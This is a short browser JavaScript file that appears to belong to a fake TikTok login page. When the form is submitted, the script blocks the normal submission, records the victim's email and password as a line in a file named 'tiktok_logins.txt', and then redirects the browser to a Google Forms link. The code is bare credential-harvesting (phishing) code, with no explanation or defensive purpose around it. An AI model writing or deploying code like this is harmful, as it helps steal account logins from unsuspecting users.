document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    saveDataToFile(email, password);

    // Redirect to the provided link
    window.location.href = 'https://forms.gle/fAiXdycZydeefyqr6';
});

function saveDataToFile(email, password) {
    const data = `${email},${password}\n`;
    const blob = new Blob([data], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);

    const link = document.createElement('a');
    link.href = url;
    link.download = 'tiktok_logins.txt';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}